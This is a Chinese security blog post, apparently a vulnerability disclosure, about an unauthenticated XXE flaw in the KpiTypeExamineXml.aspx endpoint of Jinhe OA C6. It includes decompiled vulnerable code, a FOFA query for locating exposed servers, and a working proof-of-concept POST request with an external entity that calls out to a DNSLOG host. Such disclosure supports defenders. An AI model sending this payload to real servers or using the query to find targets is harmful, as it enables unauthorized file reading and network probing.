---
title: "金和OA KpiTypeExamineXml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-KpiTypeExamineXml-xxe.html
asset_dir: assets/金和oa-kpitypeexaminexml.aspx-xxe漏洞
---

# 金和OA KpiTypeExamineXml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/28 13:31
- 447浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

软件

企业安全咨询

安全研究工具

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `KpiTypeExamineXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `KpiTypeExamineXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **KpiTypeExamineXml** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.Appraise/KpiTypeExamineXml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA KpiTypeExamineXml.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKcElEQVR4AeybgXbctg5Effv//9y3I3RILAnRsmuv9jXMCTLgzACiCdF2nfSvj4+Pv/9t/D38qvpli/XMrfKv+le9Ks39hdaVj2GtwtH73bUG8qjdv9/lBNpAHlP/+Ep89QMAPiDCz4FYQ8fcF4LP3CqHr/ndy/sRQvRQPgaEBh3dI+NY99k617aBZHLn953ANBDo04c5X20Vwl958ltiPXPOrWVcadnnHGIfgKl2OxuREqDp1bMg9FTSPptkbswh6qDG0a/1NBCRO+47gT2Q+86+fPLLBgL1tYXgq92Nnz4gvECzA+3TTSOLZOyVLdaE0PtB5OIVuQZCy9xP5C8byE9s9k/o8aMD0Vuk+M7BwfzGQXAQqN4OP8NrYcVB1FqDWENHa0L1GQPCK91hj9c/hT86kLapnXz7BPZAvn10v1M4DcRX8QyvbCPXVn7rWau4rCuH+NQBaDmFewCnX+jtyZgbQa+FyLPXea45y+09w6puGkhl2tzrTqANBOJtgGtYbRGittLyWwLhq7hVbaVB9AIquf0XNXDcmmyCmbP+2d7gvBZCg2voZwrbQLTYcf8J7IHcP4OnHfyVr+Z3c3d0vdcZoV/fzI85dN+q31inNUSt8jHcC8IDtE9no3dcu3bk89qef4v7huRTfYN8ORDobxNE7j1DrKFjpZm7ivkNW9VAPDf7nec6CB8E2iO0D0IDTB3fAAAHNjIlqlckaplC9IKOVcFyIFXBjdwf8ei/ICa2+mj1Jjjs81pozijOseKsCUe/OIi9QaA9QukKCA3Q8tMAjrceKL3qrahEYKqF4LIfgoOO6jlGrnG+b4hP4k1wD+RNBuFtLAfiKwb96sGcuxnMmnvYIzQHs1+6wz6vP0OIftnnHsaswezPunMIn3sIrRkhPLD+dhq6z7UZlwPJxp2/5gTaQKBPDp5zvRFfic+2DtG/6plrIXyZG/OrPWDu5dqx59kaogd0rHpA6NaEcM5BaMBHG8jH/vUWJ7AH8hZj6JtoP8vqVM901RSd6Rn0awaRd7VnEBp0VE9Fd60zeRVrV1flHcNq5iH2lLnKl/Uxtz+jPVc5+4X7huRTe4O8DUTTGQPiDar2OXq1tk+5o+Ig+kJH+2DmKm3sb48QzntI/+2A/nyI3M+EWEONbSAu2HjvCeyB3Hv+09PbDxchrtDkOCEg/DBjLll9arEmhOij3OE+EJrXGSE06Oh6YfYqh+7TWgEzJ94BXYfIR83rjHq+A6LO64y5Zt+QfBpvkLeBeGJ5T+Ygpgs02ZrQpHKF10Lg+JG18lWoTnHFIx/MfcUrIDSgtRM/hsXMA9N+s+4cnn3mM0J4oP98CzoHkeeaNhBvbuO9J7AHcu/5T09v/6UOcX1gxnyl3AG6z5wRZg1mzv4z9HPP9JGHeEbmITiY0f2ha+ZyD+dwzWe/ewlXHPS++4b4pH4Wv92tfdurKSqudpLXMdaYF1pT7jAH/c2AyK0JYebE53DPjCs9a1dzmPcBMzf2g/AAo/S0znvfN+TpaO5fTAPJ06q2BxzfFkLH0Qfnmrx+hvIxoNeufNag+8deWkPXAVEtgONjacQjgeCgo5/1kNtvc0bofoi8mR8JBAcdq9ppII/a/fvGE9gDufHwq0e3gUBcpWyqrpS5jK6Baz3sr3pYqxCiP9Dkz3pYbwUXE9cJVyXA9GlPNYpcp7UicxC14h1tINm48/tOoA3EE4KYGrDcFXC8GUDzuUcjHglw+B7ppd/uIXSBcoXXGSH6Q0d5Hdl7ltubEXq/szrxrlHugKi1JoTg7BGKV0BowP5XJx9v9qvdkDfb1x+7nelnWfkkIK6SrpUDZu6KVvXNnHOI/oCphn6OEDg+FSp32AihAaba/y1lr9AicPQCTD35gUNvYkogNPVzWIbQAFNPfU26TrhviE/lTbANRNM5C+B4Q4C2bWDimpgSCF+iWgqhQf8LnCY+Egj9kR6/IdbAsdYfwKV9yDuGP96RP1vbLzzznPGqUcB6v20gZ402/9oT2AN57Xl/+rQ2EOhXCSJfVev6OSD8Xuc6cxVmn/PsM1ehfVkzlxFib9l3JYeoA5odaJ8eIXI/C2INNL81oUnlDuDoZ03YBqLFjvtPYBqIpyeEeYLiFRAazF+QoWv+EGHmrAmh6xC5+Bx6rgNmDwQHHXO9cugaRC7eAcH5OWdof4WuyRpE38zZB6EB+7/UP97s13RDoE/LE6z2bE0IvQao7CWn2jFK44LM9bZVHHB8vq401wmtK/9uQDwLOrovdK7qPw2kMv0st7utTmAPZHU6N2iX/tWJr5sQ+pWDyFf7hvCo1mE/hAYdrWWE0DM39pJmDsIP/RsOa/I5Kg56LZzn7lHhqq81YVW7b0h1KjdylwYC/U3RZMfw/kdea2sZIfpJd1j3WmjOCFEHmDq+UANP2MSUQHgSVaZ67lnkAntg7gsz51oIDTD1hJcG8lSxF796Ansgv3q8X2++HAhwfCrIbSE46GgdgvNaOF5tQPQRwNEfONaf/eFeQuCoVb4K97QHog6wVP6lURNPEuB4vmX3P8PKB8895FkORIYdrz2BNhCYp1VN29vLmrkKIfpmf5W7FsIP87es0DX7K4TZB8FlP8xc1p3Duc8fi70ZIeqARgPHzYL+8TXxkbSBPPL/69//lc3vgbzZJKeB+AoKoV8viNz7h1jDfPWga/ZXCLNPz3VA6FWtPZVWcfZnrHwQz4SOrln5swZR67ozzDXOp4FY2HjPCSwHUk3W28wanL8R9kN4oGPu4Ry6PtbaI4Tw2SOE4KQ7xOeA8ACNBtoXWpOuF1ac+BzQe5h3XUboPojcfuFyILnRzl9zAnsgrznny0+ZBgJxjYDWBGhXWtdKAZ1rxkWimjEq++jReuWrNJj3BsGp3yrcD8IPmHpCoJ0JsNSA5s1G7yNz00CyuPPXn0D7x9aeVkZv5zPOOvQ3ASJ3jwohPLBG10L3rTjvRwhRo1wBsQbcor29MH8LLxNweJSPoZ5nkb2VJ+vO9w3xSZT4erL9FS7EWwBfx69uG+IZ+a250iP74d/3qJ4J0Tdrfm7mxhyiDhilYw0ctww6HsLwx74hw4HcvdwDuXsCw/PbQHwtr+LQ51iuag/DP3/YB+vr+4+9/QUSdP/VHpUPeh/oX8jl9TMzwrMfyPKRq9ZxECd/2COsLG0glbi515/ANBBg+uIDnVttEboPIq/8MGt6YxSV35x0B5z3gNAAl/4aAqfnlR867hvIcsungTRlJ7ecwB7ILcd+/tBfHwgwXelqOxA+X21h5TMnXeF1RvEOiL5ZH3MIDzBKT2v3FFpQPkalVRwwnc2vD8Qb2dhPYJX96ED8plQPtCa0rtxhrkKY36SVr9Kuct5PxqrWOsTeKg+EBlRyyf3oQMonbPJLJ7AH8qXj+n3zNBBfxTP86pbcJ9etOKB9oXON/RkrzdwKqx4r/2ea+2VfxUH/uCDyyjcNJDfe+etPoA0EYmpwDVdb9eSFlQ/iGVmD4FQzRvY5h/B7LXQdhAb951TSx7A/4+jR2rpyB/RnwHNuT4XuJbSu3NEGYnHjvSewB3Lv+U9P/x8AAAD//3seJYsAAAAGSURBVAMA8R52Zdq933EAAAAASUVORK5CYII=)

手机扫码阅读
